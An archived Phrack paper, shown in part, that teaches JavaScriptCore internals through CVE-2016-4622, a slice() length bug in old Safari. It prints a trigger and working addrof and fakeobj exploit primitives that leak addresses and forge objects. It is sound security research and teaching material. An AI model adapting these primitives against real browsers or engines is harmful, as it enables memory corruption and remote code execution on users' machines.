<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
  <meta http-equiv="Content-Style-Type" content="text/css" />
  <meta name="generator" content="pandoc" />
  <title></title>
  <style type="text/css">code{white-space: pre;}</style>
  <link rel="stylesheet" href="style.css" type="text/css" />
</head>
<body>
<p>Phrack: Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622 (saelo)</p>
<p>Archived security papers and articles in various languages. EDB-ID: 42881 Author: phrack Published: 2016-10-27 Type: Papers Platform: Magazine Language: English Advisory/Source: Link Paper: Download Paper Code Download / View Raw « Previous Paper Next Paper »</p>
<p>|=-----------------------------------------------------------------------=| |=---------------=[ The Art of Exploitation ]=---------------=| |=-----------------------------------------------------------------------=| |=------------------=[ Attacking JavaScript Engines ]=-------------------=| |=--------=[ A case study of JavaScriptCore and CVE-2016-4622 ]=---------=| |=-----------------------------------------------------------------------=| |=----------------------------=[ saelo ]=--------------------------------=| |=-----------------------=[ phrack@saelo.net ]=--------------------------=| |=-----------------------------------------------------------------------=|</p>
<p>--[ Table of contents</p>
<p>0 - Introduction 1 - JavaScriptCore overview 1.1 - Values, the VM, and (NaN-)boxing 1.2 - Objects and arrays 1.3 - Functions 2 - The bug 2.1 - The vulnerable code 2.2 - About JavaScript type conversions 2.3 - Exploiting with valueOf 2.4 - Reflecting on the bug 3 - The JavaScriptCore heaps 3.1 - Garbage collector basics 3.2 - Marked space 3.3 - Copied space 4 - Constructing exploit primitives 4.1 - Prerequisites: Int64 4.2 - addrof and fakeobj 4.3 - Plan of exploitation 5 - Understanding the JSObject system 5.1 - Property storage 5.2 - JSObject internals 5.3 - About structures 6 - Exploitation 6.1 - Predicting structure IDs 6.2 - Putting things together: faking a Float64Array 6.3 - Executing shellcode 6.4 - Surviving garbage collection 6.5 - Summary 7 - Abusing the renderer process 7.1 - WebKit process and privilege model 7.2 - The same-origin policy 7.3 - Stealing emails 8 - References 9 - Source code</p>
<p>--[ 0 - Introduction</p>
<p>This article strives to give an introduction to the topic of JavaScript engine exploitation at the example of a specific vulnerability. The particular target will be JavaScriptCore, the engine inside WebKit.</p>
<p>The vulnerability in question is CVE-2016-4622 and was discovered by yours truly in early 2016, then reported as ZDI-16-485 [1]. It allows an attacker to leak addresses as well as inject fake JavaScript objects into the engine. Combining these primitives will result in remote code execution inside the renderer process. The bug was fixed in 650552a. Code snippets in this article were taken from commit 320b1fc, which was the last vulnerable revision. The vulnerability was introduced approximately one year earlier with commit 2fa4973. All exploit code was tested on Safari 9.1.1.</p>
<p>The exploitation of said vulnerability requires knowledge of various engine internals, which are, however, also quite interesting by themselves. As such various pieces that are part of a modern JavaScript engine will be discussed along the way. We will focus on the implementation of JavaScriptCore, but the concepts will generally be applicable to other engines as well.</p>
<p>Prior knowledge of the JavaScript language will, for the most part, not be required.</p>
<p>--[ 1 - JavaScript engine overview</p>
<p>On a high level, a JavaScript engine contains</p>
<pre><code>* a compiler infrastructure, typically including at least one
  just-in-time (JIT) compiler

* a virtual machine that operates on JavaScript values

* a runtime that provides a set of builtin objects and functions</code></pre>
<p>We will not be concerned about the inner workings of the compiler infrastructure too much as they are mostly irrelevant to this specific bug. For our purposes it suffices to treat the compiler as a black box which emits bytecode (and potentially native code in the case of a JIT compiler) from the given source code.</p>
<p>----[ 1.1 - The VM, Values, and NaN-boxing</p>
<p>The virtual machine (VM) typically contains an interpreter which can directly execute the emitted bytecode. The VM is often implemented as stack-based machines (in contrast to register-based machines) and thus operate around a stack of values. The implementation of a specific opcode handler might then look something like this:</p>
<pre><code>CASE(JSOP_ADD)
{
    MutableHandleValue lval = REGS.stackHandleAt(-2);
    MutableHandleValue rval = REGS.stackHandleAt(-1);
    MutableHandleValue res = REGS.stackHandleAt(-2);
    if (!AddOperation(cx, lval, rval, res))
        goto error;
    REGS.sp--;
}
END_CASE(JSOP_ADD)</code></pre>
<p>Note that this example is actually taken from Firefox' Spidermonkey engine as JavaScriptCore (from here on abbreviated as JSC) uses an interpreter that is written in a form of assembly language and thus not quite as straightforward as the above example. The interested reader can however find the implementation of JSC's low-level interpreter (llint) in LowLevelInterpreter64.asm.</p>
<p>Often the first stage JIT compiler (sometimes called baseline JIT) takes care of removing some of the dispatching overhead of the interpreter while higher stage JIT compilers perform sophisticated optimizations, similar to the ahead-of-time compilers we are used to. Optimizing JIT compilers are typically speculative, meaning they will perform optimizations based on some speculation, e.g. 'this variable will always contain a number'. Should the speculation ever turn out to be incorrect, the code will usually bail out to one of the lower tiers. For more information about the different execution modes the reader is referred to [2] and [3].</p>
<p>JavaScript is a dynamically typed language. As such, type information is associated with the (runtime) values rather than (compile-time) variables. The JavaScript type system [4] defines primitive types (number, string, boolean, null, undefined, symbol) and objects (including arrays and functions). In particular, there is no concept of classes in the JavaScript language as is present in other languages. Instead, JavaScript uses what is called &quot;prototype-based-inheritance&quot;, where each objects has a (possibly null) reference to a prototype object whose properties it incorporates. The interested reader is referred to the JavaScript specification [5] for more information.</p>
<p>All major JavaScript engines represent a value with no more than 8 bytes for performance reasons (fast copying, fits into a register on 64-bit architectures). Some engines like Google's v8 use tagged pointers to represent values. Here the least significant bits indicate whether the value is a pointer or some form of immediate value. JavaScriptCore (JSC) and Spidermonkey in Firefox on the other hand use a concept called NaN-boxing. NaN-boxing makes use of the fact that there exist multiple bit patterns which all represent NaN, so other values can be encoded in these. Specifically, every IEEE 754 floating point value with all exponent bits set, but a fraction not equal to zero represents NaN. For double precision values [6] this leaves us with 2^51 different bit patterns (ignoring the sign bit and setting the first fraction bit to one so nullptr can still be represented). That's enough to encode both 32-bit integers and pointers, since even on 64-bit platforms only 48 bits are currently used for addressing.</p>
<p>The scheme used by JSC is nicely explained in JSCJSValue.h, which the reader is encouraged to read. The relevant part is quoted below as it will be important later on:</p>
<pre><code>* The top 16-bits denote the type of the encoded JSValue:
*
*     Pointer {  0000:PPPP:PPPP:PPPP
*              / 0001:****:****:****
*     Double  {         ...
*              \ FFFE:****:****:****
*     Integer {  FFFF:0000:IIII:IIII
*
* The scheme we have implemented encodes double precision values by
* performing a 64-bit integer addition of the value 2^48 to the number.
* After this manipulation no encoded double-precision value will begin
* with the pattern 0x0000 or 0xFFFF. Values must be decoded by
* reversing this operation before subsequent floating point operations
* may be performed.
*
* 32-bit signed integers are marked with the 16-bit tag 0xFFFF.
*
* The tag 0x0000 denotes a pointer, or another form of tagged
* immediate. Boolean, null and undefined values are represented by
* specific, invalid pointer values:
*
*     False:     0x06
*     True:      0x07
*     Undefined: 0x0a
*     Null:      0x02
*</code></pre>
<p>Interestingly, 0x0 is not a valid JSValue and will lead to a crash inside the engine.</p>
<p>----[ 1.2 - Objects and Arrays</p>
<p>Objects in JavaScript are essentially collections of properties which are stored as (key, value) pairs. Properties can be accessed either with the dot operator (foo.bar) or through square brackets (foo['bar']). At least in theory, values used as keys are converted to strings before performing the lookup.</p>
<p>Arrays are described by the specification as special (&quot;exotic&quot;) objects whose properties are also called elements if the property name can be represented by a 32-bit integer [7]. Most engines today extend this notion to all objects. An array then becomes an object with a special 'length' property whose value is always equal to the index of the highest element plus one. The net result of all this is that every object has both properties, accessed through a string or symbol key, and elements, accessed through integer indices.</p>
<p>Internally, JSC stores both properties and elements in the same memory region and stores a pointer to that region in the object itself. This pointer points to the middle of the region, properties are stored to the left of it (lower addresses) and elements to the right of it. There is also a small header located just before the pointed to address that contains the length of the element vector. This concept is called a &quot;Butterfly&quot; since the values expand to the left and right, similar to the wings of a butterfly. Presumably. In the following, we will refer to both the pointer and the memory region as &quot;Butterfly&quot;. In case it is not obvious from the context, the specific meaning will be noted.</p>
<table>
<tbody>
<tr class="odd">
<td>.. | propY | propX | length | elem0 | elem1 | elem2 | ..</td>
</tr>
</tbody>
</table>
<pre><code>                        ^
                        |
        +---------------+
        |</code></pre>
<p>+-------------+ | Some Object | +-------------+</p>
<p>Although typical, elements do not have to be stored linearly in memory. In particular, code such as</p>
<pre><code>a = [];
a[0] = 42;
a[10000] = 42;</code></pre>
<p>will likely lead to an array stored in some kind of sparse mode, which performs an additional mapping step from the given index to an index into the backing storage. That way this array does not require 10001 value slots. Besides the different array storage models, arrays can also store their data using different representations. For example, an array of 32-bit integers could be stored in native form to avoid the (NaN-)unboxing and reboxing process during most operations and save some memory. As such, JSC defines a set of different indexing types which can be found in IndexingType.h. The most important ones are:</p>
<pre><code>ArrayWithInt32      = IsArray | Int32Shape;
ArrayWithDouble     = IsArray | DoubleShape;
ArrayWithContiguous = IsArray | ContiguousShape;</code></pre>
<p>Here, the last type stores JSValues while the former two store their native types.</p>
<p>At this point the reader probably wonders how a property lookup is performed in this model. We will dive into this extensively later on, but the short version is that a special meta-object, called a &quot;structure&quot; in JSC, is associated with every object which provides a mapping from property names to slot numbers.</p>
<p>----[ 1.3 - Functions</p>
<p>Functions are quite important in the JavaScript language. As such they deserve some discussion on their own.</p>
<p>When executing a function's body, two special variables become available. One of them, 'arguments' provides access to the arguments (and caller) of the function, thus enabling the creation of function with a variable number of arguments. The other, 'this', refers to different objects depending on the invocation of the function:</p>
<pre><code>* If the function was called as a constructor (using &#39;new func()&#39;),
  then &#39;this&#39; points to the newly created object. Its prototype has
  already been set to the .prototype property of the function object,
  which is set to a new object during function definition.

* If the function was called as a method of some object (using
  &#39;obj.func()&#39;), then &#39;this&#39; will point to the reference object.

* Else &#39;this&#39; simply points to the current global object, as it does
  outside of a function as well.</code></pre>
<p>Since functions are first class objects in JavaScript they too can have properties. We've already seen the .prototype property above. Two other quite interesting properties of each function (actually of the function prototype) are the .call and .apply functions, which allow calling the function with a given 'this' object and arguments. This can for example be used to implement decorator functionality:</p>
<pre><code>function decorate(func) {
    return function() {
        for (var i = 0; i &lt; arguments.length; i++) {
            // do something with arguments[i]
        }
        return func.apply(this, arguments);
    };
}</code></pre>
<p>This also has some implications on the implementation of JavaScript functions inside the engine as they cannot make any assumptions about the value of the reference object which they are called with, as it can be set to arbitrary values from script. Thus, all internal JavaScript functions will need to check the type of not only their arguments but also of the this object.</p>
<p>Internally, the built-in functions and methods [8] are usually implemented in one of two ways: as native functions in C++ or in JavaScript itself. Let's look at a simple example of a native function in JSC: the implementation of Math.pow():</p>
<pre><code>EncodedJSValue JSC_HOST_CALL mathProtoFuncPow(ExecState* exec)
{
    // ECMA 15.8.2.1.13

    double arg = exec-&gt;argument(0).toNumber(exec);
    double arg2 = exec-&gt;argument(1).toNumber(exec);

    return JSValue::encode(JSValue(operationMathPow(arg, arg2)));
}</code></pre>
<p>We can see:</p>
<pre><code>1. The signature for native JavaScript functions

2. How arguments are extracted using the argument method (which returns
   the undefined value if not enough arguments were provided)

3. How arguments are converted to their required type. There is a set
   of conversion rules governing the conversion of e.g. arrays to
   numbers which toNumber will make use of. More on these later.

4. How the actual operation is performed on the native data type

5. How the result is returned to the caller. In this case simply by
   encoding the resulting native number into a value.</code></pre>
<p>There is another pattern visible here: the core implementation of various operations (in this case operationMathPow) are moved into separate functions so they can be called directly from JIT compiled code.</p>
<p>--[ 2 - The bug</p>
<p>The bug in question lies in the implementation of Array.prototype.slice [9]. The native function arrayProtoFuncSlice, located in ArrayPrototype.cpp, is invoked whenever the slice method is called in JavaScript:</p>
<pre><code>var a = [1, 2, 3, 4];
var s = a.slice(1, 3);
// s now contains [2, 3]</code></pre>
<p>The implementation is given below with minor reformatting, some omissions for readability, and markers for the explanation below. The full implementation can be found online as well [10].</p>
<pre><code>EncodedJSValue JSC_HOST_CALL arrayProtoFuncSlice(ExecState* exec)
{
  /* [[ 1 ]] */
  JSObject* thisObj = exec-&gt;thisValue()
                     .toThis(exec, StrictMode)
                     .toObject(exec);
  if (!thisObj)
    return JSValue::encode(JSValue());

  /* [[ 2 ]] */
  unsigned length = getLength(exec, thisObj);
  if (exec-&gt;hadException())
    return JSValue::encode(jsUndefined());

  /* [[ 3 ]] */
  unsigned begin = argumentClampedIndexFromStartOrEnd(exec, 0, length);
  unsigned end =
      argumentClampedIndexFromStartOrEnd(exec, 1, length, length);

  /* [[ 4 ]] */
  std::pair&lt;SpeciesConstructResult, JSObject*&gt; speciesResult =
    speciesConstructArray(exec, thisObj, end - begin);
  // We can only get an exception if we call some user function.
  if (UNLIKELY(speciesResult.first ==
  SpeciesConstructResult::Exception))
    return JSValue::encode(jsUndefined());

  /* [[ 5 ]] */
  if (LIKELY(speciesResult.first == SpeciesConstructResult::FastPath &amp;&amp;
        isJSArray(thisObj))) {
    if (JSArray* result =
            asArray(thisObj)-&gt;fastSlice(*exec, begin, end - begin))
      return JSValue::encode(result);
  }

  JSObject* result;
  if (speciesResult.first == SpeciesConstructResult::CreatedObject)
    result = speciesResult.second;
  else
    result = constructEmptyArray(exec, nullptr, end - begin);

  unsigned n = 0;
  for (unsigned k = begin; k &lt; end; k++, n++) {
    JSValue v = getProperty(exec, thisObj, k);
    if (exec-&gt;hadException())
      return JSValue::encode(jsUndefined());
    if (v)
      result-&gt;putDirectIndex(exec, n, v);
  }
  setLength(exec, result, n);
  return JSValue::encode(result);
}</code></pre>
<p>The code essentially does the following:</p>
<pre><code>1. Obtain the reference object for the method call (this will be the
   array object)

2. Retrieve the length of the array

3. Convert the arguments (start and end index) into native integer
   types and clamp them to the range [0, length)

4. Check if a species constructor [11] should be used

5. Perform the slicing</code></pre>
<p>The last step is done in one of two ways: if the array is a native array with dense storage, 'fastSlice' will be used which just memcpy's the values into the new array using the given index and length. If the fast path is not possible, a simple loop is used to fetch each element and add it to the new array. Note that, in contrast to the property accessors used on the slow path, fastSlice does not perform any additional bounds checking... ;)</p>
<p>Looking at the code, it is easy to assume that the variables 'begin' and <code>end</code> would be smaller than the size of the array after they had been converted to native integers. However, we can violate that assumption by (ab)using the JavaScript type conversion rules.</p>
<p>----[ 2.2 - About JavaScript conversion rules</p>
<p>JavaScript is inherently weakly typed, meaning it will happily convert values of different types into the type that it currently requires. Consider Math.abs(), which returns the absolute value of the argument. All of the following are &quot;valid&quot; invocations, meaning they won't raise an exception:</p>
<pre><code>Math.abs(-42);      // argument is a number
// 42
Math.abs(&quot;-42&quot;);    // argument is a string
// 42
Math.abs([]);       // argument is an empty array
// 0
Math.abs(true);     // argument is a boolean
// 1
Math.abs({});       // argument is an object
// NaN</code></pre>
<p>In contrast, strongly-typed languages such as python will usually raise an exception (or, in case of statically-typed languages, issue a compiler error) if e.g. a string is passed to abs().</p>
<p>The conversion rules for numeric types are described in [12]. The rules governing the conversion from object types to numbers (and primitive types in general) are especially interesting. In particular, if the object has a callable property named &quot;valueOf&quot;, this method will be called and the return value used if it is a primitive value. And thus:</p>
<pre><code>Math.abs({valueOf: function() { return -42; }});
// 42</code></pre>
<p>----[ 2.3 - Exploiting with &quot;valueOf&quot;</p>
<p>In the case of <code>arrayProtoFuncSlice</code> the conversion to a primitive type is performed in argumentClampedIndexFromStartOrEnd. This method also clamps the arguments to the range [0, length):</p>
<pre><code>JSValue value = exec-&gt;argument(argument);
if (value.isUndefined())
    return undefinedValue;

double indexDouble = value.toInteger(exec);  // Conversion happens here
if (indexDouble &lt; 0) {
    indexDouble += length;
    return indexDouble &lt; 0 ? 0 : static_cast&lt;unsigned&gt;(indexDouble);
}
return indexDouble &gt; length ? length :
                              static_cast&lt;unsigned&gt;(indexDouble);</code></pre>
<p>Now, if we modify the length of the array inside a valueOf function of one of the arguments, then the implementation of slice will continue to use the previous length, resulting in an out-of-bounds access during the memcpy.</p>
<p>Before doing this however, we have to make sure that the element storage is actually resized if we shrink the array. For that let's have a quick look at the implementation of the .length setter. From JSArray::setLength:</p>
<pre><code>unsigned lengthToClear = butterfly-&gt;publicLength() - newLength;
unsigned costToAllocateNewButterfly = 64; // a heuristic.
if (lengthToClear &gt; newLength &amp;&amp;
    lengthToClear &gt; costToAllocateNewButterfly) {
    reallocateAndShrinkButterfly(exec-&gt;vm(), newLength);
    return true;
}</code></pre>
<p>This code implements a simple heuristic to avoid relocating the array too often. To force a relocation of our array we will thus need the new size to be much less then the old size. Resizing from e.g. 100 elements to 0 will do the trick.</p>
<p>With that, here's how we can exploit Array.prototype.slice:</p>
<pre><code>var a = [];
for (var i = 0; i &lt; 100; i++)
    a.push(i + 0.123);

var b = a.slice(0, {valueOf: function() { a.length = 0; return 10; }});
// b = [0.123,1.123,2.12199579146e-313,0,0,0,0,0,0,0]</code></pre>
<p>The correct output would have been an array of size 10 filled with 'undefined' values since the array has been cleared prior to the slice operation. However, we can see some float values in the array. Seems like we've read some stuff past the end of the array elements :)</p>
<p>----[ 2.4 - Reflecting on the bug</p>
<p>This particular programming mistake is not new and has been exploited for a while now [13, 14, 15]. The core problem here is (mutable) state that is &quot;cached&quot; in a stack frame (in this case the length of the array object) in combination with various callback mechanisms that can execute user supplied code further down in the call stack (in this case the &quot;valueOf&quot; method). With this setting it is quite easy to make false assumptions about the state of the engine throughout a function. The same kind of problem appears in the DOM as well due to the various event callbacks.</p>
<p>--[ 3 - The JavaScriptCore heaps</p>
<p>At this point we've read data past our array but don't quite know what we are accessing there. To understand this, some background knowledge about the JSC heap allocators is required.</p>
<p>----[ 3.1 - Garbage collector basics</p>
<p>JavaScript is a garbage collected language, meaning the programmer does not need to care about memory management. Instead, the garbage collector will collect unreachable objects from time to time.</p>
<p>One approach to garbage collection is reference counting, which is used extensively in many applications. However, as of today, all major JavaScript engines instead use a mark and sweep algorithm. Here the collector regularly scans all alive objects, starting from a set of root nodes, and afterwards frees all dead objects. The root nodes are usually pointers located on the stack as well as global objects like the 'window' object in a web browser context.</p>
<p>There are various distinctions between garbage collection systems. We will now discuss some key properties of garbage collection systems which should help the reader understand some of the related code. Readers familiar with the subject are free to skip to the end of this section.</p>
<p>First off, JSC uses a conservative garbage collector [16]. In essence, this means that the GC does not keep track of the root nodes itself. Instead, during GC it will scan the stack for any value that could be a pointer into the heap and treats those as root nodes. In contrast, e.g. Spidermonkey uses a precise garbage collector and thus needs to wrap all references to heap objects on the stack inside a pointer class (Rooted&lt;&gt;) that takes care of registering the object with the garbage collector.</p>
<p>Next, JSC uses an incremental garbage collector. This kind of garbage collector performs the marking in several steps and allows the application to run in between, reducing GC latency. However, this requires some additional effort to work correctly. Consider the following case:</p>
<pre><code>* the GC runs and visits some object O and all its referenced objects.
  It marks them as visited and later pauses so the application can run
  again.

* O is modified and a new reference to another Object P is added to it.

* Then the GC runs again but it doesn&#39;t know about P. It finishes the
  marking phase and frees the memory of P.</code></pre>
<p>To avoid this scenario, so called write barriers are inserted into the engine. These take care of notifying the garbage collector in such a scenario. These barriers are implemented in JSC with the WriteBarrier&lt;&gt; and CopyBarrier&lt;&gt; classes.</p>
<p>Last, JSC uses both, a moving and a non-moving garbage collector. A moving garbage collector moves live objects to a different location and updates all pointers to these objects. This optimizes for the case of many dead objects since there is no runtime overhead for these: instead of adding them to a free list, the whole memory region is simply declared free. JSC stores the JavaScript objects itself, together with a few other objects, inside a non-moving heap, the marked space, while storing the butterflies and other arrays inside a moving heap, the copied space.</p>
<p>----[ 3.2 - Marked space</p>
<p>The marked space is a collection of memory blocks that keep track of the allocated cells. In JSC, every object allocated in marked space must inherit from the JSCell class and thus starts with an eight byte header, which, among other fields, contains the current cell state as used by the GC. This field is used by the collector to keep track of the cells that it has already visited.</p>
<p>There is another thing worth mentioning about the marked space: JSC stores a MarkedBlock instance at the beginning of each marked block:</p>
<pre><code>inline MarkedBlock* MarkedBlock::blockFor(const void* p)
{
    return reinterpret_cast&lt;MarkedBlock*&gt;(
                reinterpret_cast&lt;Bits&gt;(p) &amp; blockMask);
}</code></pre>
<p>This instance contains among other things a pointers to the owning Heap and VM instance which allows the engine to obtain these if they are not available in the current context. This makes it more difficult to set up fake objects, as a valid MarkedBlock instance might be required when performing certain operations. It is thus desirable to create fake objects inside a valid marked block if possible.</p>
<p>----[ 3.3 - Copied space</p>
<p>The copied space stores memory buffers that are associated with some object inside the marked space. These are mostly butterflies, but the contents of typed arrays may also be located here. As such, our out-of-bounds access happens in this memory region.</p>
<p>The copied space allocator is very simple:</p>
<pre><code>CheckedBoolean CopiedAllocator::tryAllocate(size_t bytes, void** out)
{
  ASSERT(is8ByteAligned(reinterpret_cast&lt;void*&gt;(bytes)));

  size_t currentRemaining = m_currentRemaining;
  if (bytes &gt; currentRemaining)
    return false;
  currentRemaining -= bytes;
  m_currentRemaining = currentRemaining;
  *out = m_currentPayloadEnd - currentRemaining - bytes;

  ASSERT(is8ByteAligned(*out));

  return true;
}</code></pre>
<p>This is essentially a bump allocator: it will simply return the next N bytes of memory in the current block until the block is completely used. Thus, it is almost guaranteed that two following allocations will be placed adjacent to each other in memory (the edge case being that the first fills up the current block).</p>
<p>This is good news for us. If we allocate two arrays with one element each, then the two butterflies will be next to each other in virtually every case.</p>
<p>--[ 4 - Building exploit primitives</p>
<p>While the bug in question looks like an out-of-bound read at first, it is actually a more powerful primitive as it lets us &quot;inject&quot; JSValues of our choosing into the newly created JavaScript arrays, and thus into the engine.</p>
<p>We will now construct two exploit primitives from the given bug, allowing us to</p>
<pre><code>1. leak the address of an arbitrary JavaScript object and

2. inject a fake JavaScript Object into the engine.</code></pre>
<p>We will call these primitives 'addrof' and 'fakeobj'.</p>
<p>----[ 4.1 Prerequisites: Int64</p>
<p>As we've previously seen, our exploit primitive currently returns floating point values instead of integers. In fact, at least in theory, all numbers in JavaScript are 64-bit floating point numbers [17]. In reality, as already mentioned, most engines have a dedicated 32-bit integer type for performance reasons, but convert to floating point values when necessary (i.e. on overflow). It is thus not possible to represent arbitrary 64-bit integers (and in particular addresses) with primitive numbers in JavaScript.</p>
<p>As such, a helper module had to be built which allowed storing 64-bit integer instances. It supports</p>
<pre><code>* Initialization of Int64 instances from different argument types:
  strings, numbers and byte arrays.

* Assigning the result of addition and subtraction to an existing
  instance through the assignXXX methods. Using these methods avoids
  further heap allocations which might be desirable at times.

* Creating new instances that store the result of an addition or
  subtraction through the Add and Sub functions.

* Converting between doubles, JSValues and Int64 instances such that
  the underlying bit pattern stays the same.</code></pre>
<p>The last point deserves further discussing. As we've seen above, we obtain a double whose underlying memory interpreted as native integer is our desired address. We thus need to convert between native doubles and our integers such that the underlying bits stay the same. asDouble() can be thought of as running the following C code:</p>
<pre><code>double asDouble(uint64_t num)
{
    return *(double*)&amp;num;
}</code></pre>
<p>The asJSValue method further respects the NaN-boxing procedure and produces a JSValue with the given bit pattern. The interested reader is referred to the int64.js file inside the attached source code archive for more details.</p>
<p>With this out of the way let us get back to building our two exploit primitives.</p>
<p>----[ 4.2 addrof and fakeobj</p>
<p>Both primitives rely on the fact that JSC stores arrays of doubles in native representation as opposed to the NaN-boxed representation. This essentially allows us to write native doubles (indexing type ArrayWithDoubles) but have the engine treat them as JSValues (indexing type ArrayWithContiguous) and vice versa.</p>
<p>So, here are the steps required for exploiting the address leak:</p>
<pre><code>1. Create an array of doubles. This will be stored internally as
   IndexingType ArrayWithDouble

2. Set up an object with a custom valueOf function which will

    2.1 shrink the previously created array

    2.2 allocate a new array containing just the object whose address
        we wish to know. This array will (most likely) be placed right
        behind the new butterfly since it&#39;s located in copied space

    2.3 return a value larger than the new size of the array to trigger
        the bug

3. Call slice() on the target array the object from step 2 as one of
   the arguments</code></pre>
<p>We will now find the desired address in the form of a 64-bit floating point value inside the array. This works because slice() preserves the indexing type. Our new array will thus treat the data as native doubles as well, allowing us to leak arbitrary JSValue instances, and thus pointers.</p>
<p>The fakeobj primitive works essentially the other way around. Here we inject native doubles into an array of JSValues, allowing us to create JSObject pointers:</p>
<pre><code>1. Create an array of objects. This will be stored internally as
   IndexingType ArrayWithContiguous

2. Set up an object with a custom valueOf function which will

    2.1 shrink the previously created array

    2.2 allocate a new array containing just a double whose bit pattern
        matches the address of the JSObject we wish to inject. The
        double will be stored in native form since the array&#39;s
        IndexingType will be ArrayWithDouble

    2.3 return a value larger than the new size of the array to trigger
        the bug

3. Call slice() on the target array the object from step 2 as one of
   the arguments</code></pre>
<p>For completeness, the implementation of both primitives is printed below.</p>
<pre><code>function addrof(object) {
    var a = [];
    for (var i = 0; i &lt; 100; i++)
        a.push(i + 0.1337);   // Array must be of type ArrayWithDoubles

    var hax = {valueOf: function() {
        a.length = 0;
        a = [object];
        return 4;
    }};

    var b = a.slice(0, hax);
    return Int64.fromDouble(b[3]);
}

function fakeobj(addr) {
    var a = [];
    for (var i = 0; i &lt; 100; i++)
        a.push({});     // Array must be of type ArrayWithContiguous

    addr = addr.asDouble();
    var hax = {valueOf: function() {
        a.length = 0;
        a = [addr];
        return 4;
    }};

    return a.slice(0, hax)[3];
}</code></pre>
<p>----[ 4.3 - Plan of exploitation</p>
<p>From here on our goal will be to obtain an arbitrary memory read/write primitive through a fake JavaScript object. We are faced with the following questions:</p>
<pre><code>Q1. What kind of object do we want to fake?

Q2. How do we fake such an object?

Q3. Where do we place the faked object so that we know its address?</code></pre>
<p>For a while now, JavaScript engines have supported typed arrays [18], an efficient and highly optimizable storage for raw binary data. These turn out to be good candidates for our fake object as they are mutable (in contrast to JavaScript strings) and thus controlling their data pointer yields an arbitrary read/write primitive usable from script. Ultimately our goal will now be to fake a Float64Array instance.</p>
<p>We will now turn to Q2 and Q3, which require another discussion of JSC internals, namely the JSObject system.</p>
<p>--[ 5 - Understanding the JSObject system</p>
<p>JavaScript objects are implemented in JSC by a combination of C++ classes. At the center lies the JSObject class which is itself a JSCell (and as such tracked by the garbage collector). There are various subclasses of JSObject that loosely resemble different JavaScript objects, such as Arrays (JSArray), Typed arrays (JSArrayBufferView), or Proxys (JSProxy).</p>
<p>We will now explore the different parts that make up JSObjects inside the JSC engine.</p>
<p>----[ 5.1 - Property storage</p>
<p>Properties are the most important aspect of JavaScript objects. We have already seen how properties are stored in the engine: the butterfly. But that is only half the truth. Besides the butterfly, JSObjects can also have inline storage (6 slots by default, but subject to runtime analysis), located right after the object in memory. This can result in a slight performance gain if no butterfly ever needs to be allocated for an object.</p>
<p>The inline storage is interesting for us since we can leak the address of an object, and thus know the address of its inline slots. These make up a good candidate to place our fake object in. As added bonus, going this way we also avoid any problem that might arise when placing an object outside of a marked block as previously discussed. This answers Q3.</p>
<p>Let's turn to Q2 now.</p>
<p>----[ 5.2 - JSObject internals</p>
<p>We will start with an example: suppose we run the following piece of JS code:</p>
<pre><code>obj = {&#39;a&#39;: 0x1337, &#39;b&#39;: false, &#39;c&#39;: 13.37, &#39;d&#39;: [1,2,3,4]};</code></pre>
<p>This will result in the following object:</p>
<pre><code>(lldb) x/6gx 0x10cd97c10
0x10cd97c10: 0x0100150000000136 0x0000000000000000
0x10cd97c20: 0xffff000000001337 0x0000000000000006
0x10cd97c30: 0x402bbd70a3d70a3d 0x000000010cdc7e10</code></pre>
<p>The first quadword is the JSCell. The second one the Butterfly pointer, which is null since all properties are stored inline. Next are the inline JSValue slots for the four properties: an integer, false, a double, and a JSObject pointer. If we were to add more properties to the object, a butterfly would at some point be allocated to store these.</p>
<p>So what does a JSCell contain? JSCell.h reveals:</p>
<pre><code>StructureID m_structureID;
    This is the most interesting one, we&#39;ll explore it further below.

IndexingType m_indexingType;
    We&#39;ve already seen this before. It indicates the storage mode of
    the object&#39;s elements.

JSType m_type;
    Stores the type of this cell: string, symbol,function,
    plain object, ...

TypeInfo::InlineTypeFlags m_flags;
    Flags that aren&#39;t too important for our purposes. JSTypeInfo.h
    contains further information.

CellState m_cellState;
    We&#39;ve also seen this before. It is used by the garbage collector
    during collection.</code></pre>
<p>----[ 5.3 - About structures</p>
<p>JSC creates meta-objects which describe the structure, or layout, of a JavaScript object. These objects represent mappings from property names to indices into the inline storage or the butterfly (both are treated as JSValue arrays). In its most basic form, such a structure could be an array of <property name, slot index> pairs. It could also be implemented as a linked list or a hash map. Instead of storing a pointer to this structure in every JSCell instance, the developers instead decided to store a 32-bit index into a structure table to save some space for the other fields.</p>
<p>So what happens when a new property is added to an object? If this happens for the first time then a new Structure instance will be allocated, containing the previous slot indices for all exiting properties and an additional one for the new property. The property would then be stored at the corresponding index, possibly requiring a reallocation of the butterfly. To avoid repeating this process, the resulting Structure instance can be cached in the previous structure, in a data structure called &quot;transiton table&quot;. The original structure might also be adjusted to allocate more inline or butterfly storage up front to avoid the reallocation. This mechanism ultimately makes structures reusable.</p>
<p>Time for an example. Suppose we have the following JavaScript code:</p>
<pre><code>var o = { foo: 42 };
if (someCondition)
    o.bar = 43;
else
    o.baz = 44;</code></pre>
<p>This would result in the creation of the following three Structure instances, here shown with the (arbitrary) property name to slot index mappings:</p>
<p>+-----------------+ +-----------------+ | Structure 1 | +bar | Structure 2 | | +---------&gt;| | | foo: 0 | | foo: 0 | +--------+--------+ | bar: 1 | | +-----------------+ | +baz +-----------------+ +--------&gt;| Structure 3 | | | | foo: 0 | | baz: 1 | +-----------------+</p>
<p>Whenever this piece of code was executed again, the correct structure for the created object would then be easy to find.</p>
<p>Essentially the same concept is used by all major engines today. V8 calls them maps or hidden classes [19] while Spidermonkey calls them Shapes.</p>
<p>This technique also makes speculative JIT compilers simpler. Assume the following function:</p>
<pre><code>function foo(a) {
    return a.bar + 3;
}</code></pre>
<p>Assume further that we have executed the above function a couple of times inside the interpreter and now decide to compile it to native code for better performance. How do we deal with the property lookup? We could simply jump out to the interpreter to perform the lookup, but that would be quite expensive. Assuming we've also traced the objects that were given to foo as arguments and found out they all used the same structure. We can now generate (pseudo-)assembly code like the following. Here r0 initially points to the argument object:</p>
<pre><code>mov r1, [r0 + #structure_id_offset];
cmp r1, #structure_id;
jne bailout_to_interpreter;
mov r2, [r0 + #inline_property_offset];</code></pre>
